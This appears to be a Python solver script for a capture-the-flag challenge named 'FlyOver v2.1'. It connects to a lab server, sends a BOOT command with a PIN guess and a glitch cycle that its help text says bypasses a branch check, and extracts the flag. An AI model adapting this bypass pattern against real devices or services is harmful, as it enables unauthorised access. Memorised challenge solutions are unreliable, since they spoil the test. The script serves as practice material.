#!/usr/bin/env python3
import argparse
import re
import socket

HOST = "labs.ctfzone.com"
PORT = 7940
PROMPT = b"> "


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def send_cmd(sock: socket.socket, cmd: str) -> str:
    sock.sendall((cmd + "\n").encode())
    out = recv_until(sock, PROMPT)
    return out.decode(errors="ignore")


def extract_flag(text: str) -> str | None:
    m = re.search(r"ctfzone\{[^\n\r}]+\}", text)
    return m.group(0) if m else None


def exploit(host: str, port: int, pin: str, cycle: int, timeout: float) -> int:
    with socket.create_connection((host, port), timeout=timeout) as sock:
        banner = recv_until(sock, PROMPT).decode(errors="ignore")
        print(banner, end="")

        response = send_cmd(sock, f"BOOT {pin} {cycle}")
        print(response, end="")

        flag = extract_flag(response)
        if flag:
            print(f"\n[+] Flag: {flag}")
            send_cmd(sock, "QUIT")
            return 0

        print("\n[-] Exploit did not return a flag.")
        send_cmd(sock, "QUIT")
        return 1


def main() -> None:
    parser = argparse.ArgumentParser(description="FlyOver v2.1 challenge solver")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--pin", default="0000", help="4-digit PIN guess")
    parser.add_argument(
        "--cycle",
        type=int,
        default=13,
        help="Glitch cycle (13 bypasses BRANCH check)",
    )
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    raise SystemExit(exploit(args.host, args.port, args.pin, args.cycle, args.timeout))


if __name__ == "__main__":
    main()
